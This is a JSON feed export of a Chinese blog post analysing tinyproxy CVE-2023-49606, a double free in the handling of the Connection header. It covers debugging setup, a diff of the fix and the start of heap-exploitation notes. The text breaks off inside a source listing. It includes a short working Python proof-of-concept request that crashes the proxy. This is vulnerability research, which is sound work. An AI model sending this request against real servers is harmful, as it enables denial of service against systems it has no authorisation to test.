{
    "version": "https://jsonfeed.org/version/1",
    "title": "xsh 的世界",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2024/08/14/tinyproxy-CVE-2023-49606/",
            "url": "http://example.com/2024/08/14/tinyproxy-CVE-2023-49606/",
            "title": "tinyproxy-CVE-2023-49606",
            "date_published": "2024-08-13T16:43:13.000Z",
            "content_html": "<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>Tinyproxy 是一个轻量级的 HTTP&#x2F;HTTPS 代理服务器，主要用于提供基本的代理功能，同时占用较少的系统资源。</p>\n<p>CVE-2023-49606 是 http 标头导致的 UAF，比较新鲜，所以分析下</p>\n<h2 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><p>先在 <a href=\"https://github.com/tinyproxy/tinyproxy\">https://github.com/tinyproxy/tinyproxy</a> 拉取 1.11.1 版本的 tinyproxy。</p>\n<p>执行以下命令进行编译</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./autogen.sh</span><br><span class=\"line\"></span><br><span class=\"line\">./configure --enable-debug</span><br><span class=\"line\">make</span><br><span class=\"line\">sudo make install</span><br></pre></td></tr></table></figure>\n\n<p>利用以下命令启动 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/local/bin/tinyproxy</span><br></pre></td></tr></table></figure>\n\n<p>然后访问 8888 端口即可</p>\n<p><img src=\"/2024/08/14/tinyproxy-CVE-2023-49606/b10f6a7df8f535dec8c648fd7d54c9aa.png\" alt=\"b10f6a7df8f535dec8c648fd7d54c9aa\"></p>\n<p>调试方面我选择直接利用 gdb attach 上去</p>\n<p>先将对应程序拉取出来 IDA 进行反汇编</p>\n<p><img src=\"/2024/08/14/tinyproxy-CVE-2023-49606/a6888624a1ad5c1147e21f6c1792e5a6.png\" alt=\"a6888624a1ad5c1147e21f6c1792e5a6\"></p>\n<p>接着查看进程号</p>\n<p><img src=\"/2024/08/14/tinyproxy-CVE-2023-49606/98a85ec7396ff8b540f7050858e510f5.png\" alt=\"98a85ec7396ff8b540f7050858e510f5\"></p>\n<p>调试之前需要将机器的 ptrace_scope 设置为 0</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo sh -c &#x27;echo &quot;0&quot; &gt; /proc/sys/kernel/yama/ptrace_scope&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>就可以愉快调试</p>\n<p><img src=\"/2024/08/14/tinyproxy-CVE-2023-49606/a2c330dcc0f2b571bb2e38b41393028c.png\"></p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>通过 git 提交记录 <a href=\"https://github.com/tinyproxy/tinyproxy/commit/12a8484265f7b00591293da492bb3c9987001956\">https://github.com/tinyproxy/tinyproxy/commit/12a8484265f7b00591293da492bb3c9987001956</a> ，可以看到 diff 结果</p>\n<p><img src=\"/2024/08/14/tinyproxy-CVE-2023-49606/860932f95a1f9a32dd9fb3470f2ee989.png\" alt=\"860932f95a1f9a32dd9fb3470f2ee989\">、</p>\n<p>为了方便，把两个版本的源码下载通过 vscode diff</p>\n<p>可以看到 diff 结果有好几处不同<img src=\"/2024/08/14/tinyproxy-CVE-2023-49606/5828637ade512f753b9cae32da5a5ef9.png\"></p>\n<p>修复的地方也被作者写注释了</p>\n<p><img src=\"/2024/08/14/tinyproxy-CVE-2023-49606/765ca0de167930370245415fafa6f294.png\"></p>\n<p>接着通过网上搜集信息，在 <a href=\"https://talosintelligence.com/vulnerability_reports/TALOS-2023-1889\">https://talosintelligence.com/vulnerability_reports/TALOS-2023-1889</a> 该文章披露了漏洞细节，所以跟着再走下流程，把 poc 写出来</p>\n<p>首先是正常的交互，tinyproxy 是一个代理程序，所以，host 是代理去往目标地址，正常的交互最简单的请求包如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&#x27;http://127.0.0.1:8888&#x27;</span></span><br><span class=\"line\">headers = &#123;<span class=\"string\">&#x27;Connection&#x27;</span>: <span class=\"string\">&#x27;close&#x27;</span>, <span class=\"string\">&#x27;Host&#x27;</span>: <span class=\"string\">&#x27;127.0.0.1:8000&#x27;</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">response = requests.get(url, headers=headers)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(response.text)</span><br></pre></td></tr></table></figure>\n\n<p>比如我在 Desktop 下利用 python 开启了一个 http 服务器</p>\n<p><img src=\"/2024/08/14/tinyproxy-CVE-2023-49606/bb6eb248e924da12c21d02efc037b63c.png\" alt=\"bb6eb248e924da12c21d02efc037b63c\"></p>\n<p>那么上面请求包的返回结果就是 python http 服务器的内容</p>\n<p><img src=\"/2024/08/14/tinyproxy-CVE-2023-49606/240d475d10cffe4c5000657e0e8ab4d0.png\" alt=\"240d475d10cffe4c5000657e0e8ab4d0\"></p>\n<p>host 乱填时候，一直报 500，以为是软件问题，又通过 apt 安装了一个，还是一样的问题，后面我也是看日志才知道 host 是目标服务器地址，host 乱填时候，日志一直报 connect fail，所以就给他填了个能正常访问的地址</p>\n<p>其漏洞点在于 connection 关键词的处理，从下面的 diff 中可以看到，函数名为 remove_connection_headers ，是用来处理释放 connection 操作的</p>\n<p><img src=\"/2024/08/14/tinyproxy-CVE-2023-49606/8a469b67ece47ff2518e9412480e1e79.png\" alt=\"8a469b67ece47ff2518e9412480e1e79\"></p>\n<p>结合调试中，可以确定 data 和 ptr 是 connection 关键词的值</p>\n<p><img src=\"/2024/08/14/tinyproxy-CVE-2023-49606/2239e18e398f2322e8e5cff9ba91a6ac.png\" alt=\"2239e18e398f2322e8e5cff9ba91a6ac\"></p>\n<p>然后会利用 orderedmap_remove 函数从 head 的哈希结果表中去除 connetction:close</p>\n<p><img src=\"/2024/08/14/tinyproxy-CVE-2023-49606/48a24d4fce36254f554207178a57081a.png\"></p>\n<p>orderedmap_remove  是一个先计算哈希，再根据哈希结果从哈希表删除哈希结果的函数</p>\n<ol>\n<li>会利用 htab_find2 函数取计算 key 的哈希，并且判断结果是否在哈希表中</li>\n<li>如果在，那么利用 sblist_get 函数获取哈希表中键对应的键值的堆指针</li>\n<li>利用 free 释放值的堆指针</li>\n<li>利用 while 处理哈希链表</li>\n<li>将键也从哈希表中删除</li>\n<li>利用 free 释放键的堆指针</li>\n</ol>\n<p><img src=\"/2024/08/14/tinyproxy-CVE-2023-49606/19c1552b25cf6eabc6cb2e22b84adff9.png\" alt=\"19c1552b25cf6eabc6cb2e22b84adff9\"></p>\n<p>当请求包包含 connection:close 时候，上面一张 gdb 调试截图中因为哈希表中没有 close 关键词，会在  if(!v) return 0 直接退出，进入下面的 orderdmap_remove 函数</p>\n<p><img src=\"/2024/08/14/tinyproxy-CVE-2023-49606/d7009aa2ff90fd05932a9c64ceb32fbf.png\" alt=\"d7009aa2ff90fd05932a9c64ceb32fbf\"></p>\n<p>如在 gdb 中</p>\n<p><img src=\"/2024/08/14/tinyproxy-CVE-2023-49606/7a739d522ef8fa7d023cc48a59257f7c.png\"></p>\n<p>poc 如下，如果我们修改请求包中的 connection:close 为 connection:connection 时候</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&#x27;http://127.0.0.1:8888&#x27;</span></span><br><span class=\"line\">headers = &#123;<span class=\"string\">&#x27;Connection&#x27;</span>: <span class=\"string\">&#x27;Connection&#x27;</span>, <span class=\"string\">&#x27;Host&#x27;</span>: <span class=\"string\">&#x27;127.0.0.1:8000&#x27;</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">response = requests.get(url, headers=headers)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(response.text)</span><br></pre></td></tr></table></figure>\n\n<p>可以看到，在删除键的时候，先对 Connection 释放一次，这个 Connection  是 Connection 键的值</p>\n<p><img src=\"/2024/08/14/tinyproxy-CVE-2023-49606/5d719467f6757158071b917226974054.png\"></p>\n<p>接下来继续重点看该函数</p>\n<p><img src=\"/2024/08/14/tinyproxy-CVE-2023-49606/image-20240513230540527.png\" alt=\"image-20240513230540527\"></p>\n<p>在这个函数中是不强制区分键和值的，因此 Connect 可以作为键使用的，所以，在 orderedmap_remove 函数处理时候，sblist_get 函数获取键对应的值指针时候，拿到是 Connection 作为键时候的堆指针。</p>\n<p><img src=\"/2024/08/14/tinyproxy-CVE-2023-49606/5fe2547e500dbeba7d62ff6ebdb76266.png\" alt=\"5fe2547e500dbeba7d62ff6ebdb76266\"></p>\n<p>本来上面那一步应该要释放 Connection  作为值的堆指针，但是却因为哈希原因错乱了，这就导致在后面利用 htab_delete 去删除键的哈希时候，会把已经 free 的 Connection  作为键的堆指针给删去。</p>\n<p><img src=\"/2024/08/14/tinyproxy-CVE-2023-49606/6e145c9a101937a2fb772b404ec3ae2d.png\" alt=\"6e145c9a101937a2fb772b404ec3ae2d\"></p>\n<p>可以看到已经被放入 bin 了</p>\n<p><img src=\"/2024/08/14/tinyproxy-CVE-2023-49606/4782e3ae8ab89e74f7d90c310a6084b9.png\" alt=\"4782e3ae8ab89e74f7d90c310a6084b9\"></p>\n<p>在这里时候，还不会发生 crash，到了程序末尾，利用 orderedmap_destroy 函数去 free 删去的键堆指针时候，就会发生 double free 导致 crash</p>\n<p><img src=\"/2024/08/14/tinyproxy-CVE-2023-49606/06d28d5c06d7dc6085f8bdf0b67b1ecc.png\" alt=\"06d28d5c06d7dc6085f8bdf0b67b1ecc\"></p>\n<p>实质上是调用 orderedmap_destroy_contents 循环 free 指针，而后 free 哈希表</p>\n<p><img src=\"/2024/08/14/tinyproxy-CVE-2023-49606/36e40ac987f03c09a1387b7eb0e2f21c.png\" alt=\"36e40ac987f03c09a1387b7eb0e2f21c\"></p>\n<p>就在这里导致了 crash</p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>因为该程序是动态编译，其链接的是本地的 libc.so ，因此堆管理方式取决于 libc 中堆的实现，考虑到该程序一般是运行在 linux 服务器，因此尝试在 ptmalloc glibc_2.27 以上环境进行利用，没有 tcache bin 机制的 ubuntu16 就太老了。</p>\n<p>由于是 double free 漏洞，如果要完成利用，那么需要</p>\n<p>1.控制堆，比如令其在 fastbin 上进行 double free，并且需要能操控 double free 后的堆块</p>\n<p>2.可能泄露内存信息 </p>\n<p>由于是一个堆漏洞，为了写利用，需要把整个程序的大概实现都看一下。</p>\n<p>child.c 中的 child_main_loop 函数是起始函数，在这个函数中，实现了对child 结构体（单线程中存放信息的结构体）和  childs 结构体（存放所有 chlid）的初始化</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">child_main_loop</span> <span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 其它省略代码</span></span><br><span class=\"line\"></span><br><span class=\"line\">        childs = sblist_new(<span class=\"keyword\">sizeof</span> (<span class=\"keyword\">struct</span> child*), config-&gt;maxclients);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 其它省略代码</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * We have to wait for connections on multiple fds,</span></span><br><span class=\"line\"><span class=\"comment\">         * so use select/poll/whatever.</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (!config-&gt;quit) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                collect_threads();</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">// 其它省略代码</span></span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">                 * We have a socket that is readable.</span></span><br><span class=\"line\"><span class=\"comment\">                 * Continue handling this connection.</span></span><br><span class=\"line\"><span class=\"comment\">                 */</span></span><br><span class=\"line\"></span><br><span class=\"line\">                clilen = <span class=\"keyword\">sizeof</span>(cliaddr_storage);</span><br><span class=\"line\">                connfd = accept (listenfd, cliaddr, &amp;clilen);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">                 * Make sure no error occurred...</span></span><br><span class=\"line\"><span class=\"comment\">                 */</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (connfd &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                        log_message (LOG_ERR,</span><br><span class=\"line\">                                     <span class=\"string\">&quot;Accept returned an error (%s) ... retrying.&quot;</span>,</span><br><span class=\"line\">                                     strerror (errno));</span><br><span class=\"line\">                        <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                child = safecalloc(<span class=\"number\">1</span>, <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> child));</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!child) &#123;</span><br><span class=\"line\">oom:</span><br><span class=\"line\">                        close(connfd);</span><br><span class=\"line\">                        log_message (LOG_CRIT,</span><br><span class=\"line\">                                     <span class=\"string\">&quot;Could not allocate memory for child.&quot;</span>);</span><br><span class=\"line\">                        usleep(<span class=\"number\">16</span>); <span class=\"comment\">/* prevent 100% CPU usage in OOM situation */</span></span><br><span class=\"line\">                        <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                child-&gt;done = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!sblist_add(childs, &amp;child)) &#123;</span><br><span class=\"line\">                        <span class=\"built_in\">free</span>(child);</span><br><span class=\"line\">                        <span class=\"keyword\">goto</span> oom;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                conn_struct_init(&amp;child-&gt;conn);</span><br><span class=\"line\">                child-&gt;conn.client_fd = connfd;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"built_in\">memcpy</span>(&amp;child-&gt;client.addr, &amp;cliaddr_storage, <span class=\"keyword\">sizeof</span>(cliaddr_storage));</span><br><span class=\"line\"></span><br><span class=\"line\">                attrp = <span class=\"number\">0</span>;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (pthread_attr_init(&amp;attr) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                        attrp = &amp;attr;</span><br><span class=\"line\">                        pthread_attr_setstacksize(attrp, <span class=\"number\">256</span>*<span class=\"number\">1024</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (pthread_create(&amp;child-&gt;thread, attrp, child_thread, child) != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                        sblist_delete(childs, sblist_getsize(childs) <span class=\"number\">-1</span>);</span><br><span class=\"line\">                        <span class=\"built_in\">free</span>(child);</span><br><span class=\"line\">                        <span class=\"keyword\">goto</span> oom;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">\tsafefree(fds);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>如上，主要是申请了 child 结构体，将 done 置 0，表示未被启动，并且利用 conn_struct_init 函数初始化，同时赋予 child-&gt;conn.client_fd  为被代理机器  socket 接受到的 connfd。后面就是开始线程启动 child_thread，同时将线程标志放入 child 结构体中的 thread</p>\n<p>child 结构体如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">child</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"type\">pthread_t</span> thread;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">client</span> <span class=\"title\">client</span>;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">conn_s</span> <span class=\"title\">conn</span>;</span></span><br><span class=\"line\">\t<span class=\"keyword\">volatile</span> <span class=\"type\">int</span> done;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>重点关注是存放 http 信息的 conn 结构体，定义如下。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">conn_s</span> &#123;</span></span><br><span class=\"line\">        <span class=\"type\">int</span> client_fd;</span><br><span class=\"line\">        <span class=\"type\">int</span> server_fd;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">buffer_s</span> *<span class=\"title\">cbuffer</span>;</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">buffer_s</span> *<span class=\"title\">sbuffer</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* The request line (first line) from the client */</span></span><br><span class=\"line\">        <span class=\"type\">char</span> *request_line;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Booleans */</span></span><br><span class=\"line\">        <span class=\"type\">unsigned</span> <span class=\"type\">int</span> connect_method;</span><br><span class=\"line\">        <span class=\"type\">unsigned</span> <span class=\"type\">int</span> show_stats;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * This structure stores key -&gt; value mappings for substitution</span></span><br><span class=\"line\"><span class=\"comment\">         * in the error HTML files.</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">htab</span> *<span class=\"title\">error_variables</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">int</span> error_number;</span><br><span class=\"line\">        <span class=\"type\">char</span> *error_string;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* A Content-Length value from the remote server */</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">                <span class=\"type\">long</span> <span class=\"type\">int</span> server;</span><br><span class=\"line\">                <span class=\"type\">long</span> <span class=\"type\">int</span> client;</span><br><span class=\"line\">        &#125; content_length;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * Store the server&#x27;s IP (for BindSame)</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        <span class=\"type\">char</span> *server_ip_addr;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * Store the client&#x27;s IP information</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        <span class=\"type\">char</span> *client_ip_addr;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * Store the incoming request&#x27;s HTTP protocol.</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">                <span class=\"type\">unsigned</span> <span class=\"type\">int</span> major;</span><br><span class=\"line\">                <span class=\"type\">unsigned</span> <span class=\"type\">int</span> minor;</span><br><span class=\"line\">        &#125; protocol;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> REVERSE_SUPPORT</span></span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * Place to store the current per-connection reverse proxy path</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        <span class=\"type\">char</span> *reversepath;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * Pointer to upstream proxy.</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">upstream</span> *<span class=\"title\">upstream_proxy</span>;</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>有注释就不解释了</p>\n<p>child_thread 函数是执行 handle_connection 函数，同时闯入 conn 和 客户端地址，置 done 为 1</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span>* <span class=\"title function_\">child_thread</span><span class=\"params\">(<span class=\"type\">void</span>* data)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">child</span> *<span class=\"title\">c</span> =</span> data;</span><br><span class=\"line\">\thandle_connection (&amp;c-&gt;conn, &amp;c-&gt;client.addr);</span><br><span class=\"line\">\tc-&gt;done = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>handle_connection 函数则执行主要功能</p>\n<p>先是接受客户端发送的 http 请求，同时处理 http 标头</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (read_request_line (connptr) &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">               update_stats (STAT_BADCONN);</span><br><span class=\"line\">               <span class=\"keyword\">goto</span> done;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">        * The &quot;hashofheaders&quot; store the client&#x27;s headers.</span></span><br><span class=\"line\"><span class=\"comment\">        */</span></span><br><span class=\"line\">       hashofheaders = orderedmap_create (HEADER_BUCKETS);</span><br><span class=\"line\">       <span class=\"keyword\">if</span> (hashofheaders == <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">               update_stats (STAT_BADCONN);</span><br><span class=\"line\">               indicate_http_error (connptr, <span class=\"number\">503</span>, <span class=\"string\">&quot;Internal error&quot;</span>,</span><br><span class=\"line\">                                    <span class=\"string\">&quot;detail&quot;</span>,</span><br><span class=\"line\">                                    <span class=\"string\">&quot;An internal server error occurred while processing &quot;</span></span><br><span class=\"line\">                                    <span class=\"string\">&quot;your request. Please contact the administrator.&quot;</span>,</span><br><span class=\"line\">                                    <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">               HC_FAIL();</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">        * Get all the headers from the client in a big hash.</span></span><br><span class=\"line\"><span class=\"comment\">        */</span></span><br><span class=\"line\">       <span class=\"keyword\">if</span> (get_all_headers (connptr-&gt;client_fd, hashofheaders) &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">               log_message (LOG_WARNING,</span><br><span class=\"line\">                            <span 